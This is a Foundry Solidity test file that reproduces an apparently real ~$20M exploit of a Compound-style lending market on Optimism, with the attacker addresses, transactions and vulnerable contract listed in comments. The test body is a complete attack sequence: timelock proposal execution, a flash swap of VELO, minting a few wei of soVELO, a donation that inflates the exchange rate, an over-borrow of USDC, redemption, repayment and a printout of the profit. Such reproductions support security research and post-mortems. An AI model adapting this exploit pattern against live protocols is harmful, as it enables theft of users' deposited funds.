// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~$20M USD$
// Attacker EOA1 : https://optimistic.etherscan.io/address/0x5d0d99e9886581ff8fcb01f35804317f5ed80bbb
// Attacker EOA2 : https://optimistic.etherscan.io/address/0xae4a7cde7c99fb98b0d5fa414aa40f0300531f43


// Attack Tx1 : https://optimistic.etherscan.io/tx/0x45c0ccfd3ca1b4a937feebcb0f5a166c409c9e403070808835d41da40732db96
// Attack Tx2 : https://optimistic.etherscan.io/tx/0x9312ae377d7ebdf3c7c3a86f80514878deb5df51aad38b6191d55db53e42b7f0

// Attack Contract1 : https://optimistic.etherscan.io/address/0xa78aefd483ce3919c0ad55c8a2e5c97cbac1caf8
// Attack Contract2 : https://optimistic.etherscan.io/address/0x02FA2625825917E9b1F8346a465dE1bBC150C5B9

// @Info
// Vulnerable Contract Code : https://optimistic.etherscan.io/address/0xe3b81318b1b6776f0877c3770afddff97b9f5fe5


interface TimelockController {
    function execute(address target, uint256 value, bytes memory data, bytes32 predecessor, bytes32 salt) external payable;
}

interface VolatileV2Pool {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}



contract ContractTest is Test {

    address soVELO = 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5;

    address soUSDC = 0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F;

    address Unitroller = 0x60CF091cD3f50420d50fD7f707414d0DF4751C58;

    address VELO_Token_V2 = 0x9560e827aF36c94D2Ac33a39bCE1Fe78631088Db;

    address USDC =  0x7F5c764cBc14f9669B88837ca1490cCa17c31607;

    address VolatileV2_USDC_VELO = 0x8134A2fDC127549480865fB8E5A9E8A8a95a54c5;

    TimelockController t = TimelockController(0x37fF10390F22fABDc2137E428A6E6965960D60b6);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/optimism", 120062493 - 1);
    }

    function testExploit() public {

        // 1. Execute proposals

        bytes memory data1 = hex"fca7820b0000000000000000000000000000000000000000000000000429d069189e0000";

        bytes memory data2 = hex"f2b3abbd0000000000000000000000007320bd5fa56f8a7ea959a425f0c0b8cac56f741e";

        bytes memory data3 = hex"55ee1fe100000000000000000000000022c7e5ce392bc951f63b68a8020b121a8e1c0fea";

        bytes memory data4 = hex"a76b3fda000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5";

        bytes memory data5 = hex"e4028eee000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000004db732547630000";

        t.execute(soVELO, 0, data1, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x476d385370ae53ff1c1003ab3ce694f2c75ebe40422b0ba11def4846668bc84c);

        t.execute(soVELO, 0, data2, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xa57973a3d5a5d99d454c54117d7d30a57a8aca089891f505f120174216edaf42);

        t.execute(Unitroller, 0, data3, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x42408274449fd7829d7fb6abe2e89a618a853acf68d1553b2f6b8b671ac443fd);

        t.execute(Unitroller, 0, data4, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xb02c80e66eae74aef841e5d998aef03d201de66590950b6353e9a28b289c8c8b);

        t.execute(Unitroller, 0, data5, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xe50459992a5c9678d53efbffbf6b95687111e5789dada996e41fea2986077bed);

        // 2. Approve VELO to soVEOLO 

        IERC20(VELO_Token_V2).approve(soVELO, type(uint256).max);

        // 3. FlashLoan

        VolatileV2Pool(VolatileV2_USDC_VELO).swap(0, 35469150965253049864450449, address(this), hex"01" );

    }


    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {

        // 4. Mint 2 wei soVELO 
        CErc20Interface(soVELO).mint(400000001);

        uint256 Velo_amount_of_soVelo = IERC20(VELO_Token_V2).balanceOf(soVELO);

        console.log("Amount of VELO OF soVELO after minting", Velo_amount_of_soVelo);

        console.log("Amount of soVELO been mint", IERC20(soVELO).balanceOf(address(this)));

        // 5. Transfer All VELO_Token_V2 to soVELO

        uint256 VeloAmountOfthis = IERC20(VELO_Token_V2).balanceOf(address(this));

        IERC20(VELO_Token_V2).transfer(soVELO,VeloAmountOfthis);

        uint256 Velo_amount_of_soVelo_after_transfer = IERC20(VELO_Token_V2).balanceOf(soVELO);

        console.log("Amount of VELO OF soVELO after tranfer", Velo_amount_of_soVelo_after_transfer);




        // 6. Enter Market

        address[] memory cTokens = new address[](2);    
        cTokens[0] = soUSDC;
        cTokens[1] = soVELO;

        IUnitroller(Unitroller).enterMarkets(cTokens);

        CErc20Interface(soUSDC).borrow(768947220961);

        uint256 usdc_amount_after_borrow = IERC20(USDC).balanceOf(address(this));

        console.log("usdc_amount_after_borrow", usdc_amount_after_borrow);




        // 7. Redeem 

        // uint256 Amount_redeemAllowed = ICointroller(Unitroller).redeemAllowed(soVELO,address(this),2);

        ICErc20Delegate(soVELO).redeemUnderlying(Velo_amount_of_soVelo_after_transfer - 1);

        // ICErc20Delegate(soVELO).redeemUnderlying(1);


        uint256 Velo_amount_of_Attacker_after_redeem = IERC20(VELO_Token_V2).balanceOf(address(this));

        console.log("Velo_amount_of_Attacker_after_redeem", Velo_amount_of_Attacker_after_redeem);


        // // 8. LiquidateBorrow

        // ICErc20Delegate(soUSDC).liquidateBorrow(address(this), 4651761644569103, soVELO);


        // 9. Repay FlashLoan 


        IERC20(VELO_Token_V2).transfer(VolatileV2_USDC_VELO,amount1 - 1);

        // 10. Repay FlashLoan Fee with USDC

        IERC20(USDC).transfer(VolatileV2_USDC_VELO,44656863632);


        // 11. Check profit from this attack

        uint256 Profit = IERC20(USDC).balanceOf(address(this));


        console.log("---------------------------------------------------");

        console.log("USDC Profit from this attack: $", Profit / 10 ** 6 );

        console.log("---------------------------------------------------");

    }

}




